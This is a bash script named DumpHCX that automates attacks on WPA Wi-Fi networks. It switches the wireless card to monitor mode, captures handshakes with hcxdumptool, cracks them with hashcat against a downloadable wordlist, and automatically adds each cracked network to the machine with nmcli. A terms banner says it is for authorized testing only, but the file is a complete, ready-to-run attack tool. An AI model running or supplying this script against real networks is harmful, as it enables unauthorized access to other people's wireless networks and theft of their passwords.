#!/bin/bash

# Coded by Ahmed Noaman with some help of ChatGPT
# email  : an758592@gmail.com
# github : https://github.com/an758592/

# Variables
tools=("hcxtools" "hcxdumptool" "wget" "gzip" "iw" "hashcat")
default_interface="wlan0"
default_wordlist="/usr/share/wordlists/cracked.txt"

# Colors for output
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Function to print the banner
function print_banner {
    clear
    echo -e "${RED}██  ██  ██  ██████  ██████████${RESET}"
    echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
    echo -e "${RED}██  ██  ██    ██    ████    ██${RESET}"
    echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
    echo -e "${RED}██████████  ██████  ██    ████${RESET} - ${BLUE}DumpHCX${RESET}"
    echo ""
}

# Function to print terms and conditions
function print_terms {
    echo "=> By using this script you agree to the following terms :"
    echo "=> Usage           : The script is for educational and testing purposes only, and users must have the necessary permissions for security testing on wireless networks."
    echo "=> Responsibility  : Users are solely responsible for their actions using the script, including compliance with laws and regulations."
    echo "=> No Warranty     : The script is provided as is, without any warranties."
    echo "=> No Liability    : The author of the script are not liable for damages arising from its use."
    echo "=> Ethical Use     : Users agree to use the script ethically and responsibly, obtaining proper authorization before testing networks."
    echo "=> Compliance      : Users agree to comply with all applicable laws, regulations, and ethical guidelines."
    echo "=> Indemnification : Users agree to indemnify the author from any claims arising from their use of the script."
    echo "=> Modification    : Users may modify the script for personal use but may not distribute modified versions without permission."
    echo "=> Termination     : The author reserve the right to terminate or suspend access to the script without notice."
    echo "=> Acceptance      : By using the script, users acknowledge and agree to these terms and conditions."
    echo ""
}

# Function to check if the script is run as root
function check_root {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}> This script must be run as root. Exiting...${RESET}"
        exit 1
    fi
}

# Function to detect the Linux distribution
function detect_distro {
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        distribution="$ID"
    fi
}

# Function to install necessary tools
function install_tools {
    for tool in ${tools[@]}; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${BLUE}> Installing $tool...${RESET}"
            case $distribution in
                ubuntu|kali|debian|linuxmint|zorin)
                    apt update -y
                    apt install $tool -y
                    ;;
                fedora)
                    dnf update -y
                    dnf install $tool -y
                    ;;
                arch)
                    pacman -Sy
                    pacman -S --noconfirm $tool
                    ;;
                *)
                    echo -e "${RED}> Install $tool MANUALLY, and try again.${RESET}"
                    exit 1
                    ;;
            esac
        else
            echo -e "${BLUE}> $tool is already installed.${RESET}"
        fi
    done
}

# Function to set up the network interface for packet capture
function setup_network {
    ip addr
    read -p "> Enter the interface name (default: $default_interface) : " interface
    interface=${interface:-$default_interface}
    echo -e "${BLUE}> Setting up $interface...${RESET}"
    read -p "> Enter the name of the file to save the capture (without extension): " cap
    cap=${cap:-"$(pwd)/$(date +%T)"}
    echo -e "${BLUE}> Starting handshake capture on $interface...${RESET}"
    systemctl stop wpa_supplicant.service
    systemctl stop NetworkManager.service
    systemctl daemon-reload
    ip link set $interface down
    iw dev $interface set type monitor
    ip link set $interface up
}

# Function to capture the handshake and convert it to hash
function capture_handshake {
    hcxdumptool -i $interface -w $cap.pcapng
    hcxpcapngtool -o $cap.hash -E ESSID.txt $cap.pcapng
    ip link set $interface down
    iw dev $interface set type managed
    ip link set $interface up
    systemctl start wpa_supplicant.service
    systemctl start NetworkManager.service
    systemctl daemon-reload
    echo -e "${BLUE}> Handshake capture completed. File saved as $cap.pcapng${RESET}"
}

# Function to start cracking the handshake
function start_cracking {
    read -p "> Start password cracking with HASHCAT? [y/n] : " crack
    case $crack in
        y|Y)
            read -p "> Do you want to use the default wordlist, download a new one, or specify another? [1=default/2=download/3=specify] : " download
            case $download in
                1)
                    wordlist=$default_wordlist
                    ;;                
                2)
                    mkdir -p /usr/share/wordlists/
                    wget -O /usr/share/wordlists/cracked.txt.gz https://wpa-sec.stanev.org/dict/cracked.txt.gz
                    gunzip /usr/share/wordlists/cracked.txt.gz
                    wordlist=$default_wordlist
                    ;;
                3)
                    read -p "> Enter the PATH and NAME to the WORDLIST [/path/name] : " wordlist
                    ;;
                *)
                    exit 1
                    ;;
            esac
            hashcat -a 0 -m 22000 -w 4 $cap.hash $wordlist -o $cap.hacked
            if [ $? -eq 0 ]; then
                while IFS=: read -r _ _ _ SSID PASSWORD; do
                    if [[ -n $SSID && -n $PASSWORD ]]; then
                        echo -e "${RED}> Adding network SSID: $SSID with PASSWORD: $PASSWORD ${RESET}"
                        nmcli connection add type wifi con-name $SSID ifname $interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $PASSWORD
                    else
                        echo -e "${RED}> No network has been hacked.${RESET}"
                    fi
                done < $cap.hacked
            else
                echo -e "${RED}> Cracking failed. Exiting...${RESET}"
                exit 1
            fi
            ;;
        *)
            exit 0
            ;;
    esac
}

# Main script execution starts here
print_banner
print_terms

read -p "> Do you agree with these TERMS? [y=YES-continue/n=NO-exit] : " terms
case $terms in
    y|Y)
        check_root
        detect_distro
        install_tools
        setup_network
        capture_handshake
        start_cracking
        ;;
    *)
        echo -e "${RED}> You are UNAUTHORIZED to use the Script.${RESET}"
        exit 1
        ;;
esac
